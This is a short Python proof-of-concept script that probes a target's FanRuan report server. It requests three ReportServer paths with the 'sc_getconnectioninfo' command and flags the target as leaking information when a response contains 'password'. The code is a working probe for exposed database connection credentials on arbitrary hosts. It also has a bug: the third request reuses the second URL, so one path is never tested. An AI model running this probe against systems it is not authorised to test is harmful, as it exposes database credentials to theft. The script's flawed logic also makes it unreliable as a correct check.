import httpx
from lib.get_normal_url import get_standard_url
headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
}

def poc(target):
    try:
        target = get_standard_url(target)
        url1 = target + "/ReportServer?op=fr_server&cmd=sc_getconnectioninfo"
        url2 = target +  "/seeyonreport/ReportServer?op=fr_server&cmd=sc_getconnectioninfo"
        url3 = target + "/WebReport/ReportServer?op=fr_server&cmd=sc_getconnectioninfo"

        res1 = httpx.get(url1,headers=headers)
        res2 = httpx.get(url2,headers=headers)
        res3 = httpx.get(url2, headers=headers)

        if "password" in res1.text or "password" in res2.text or "password" in res3.text:
            print("\033[0;31m 帆软 信息泄露漏洞："+ target )
    except:
        pass


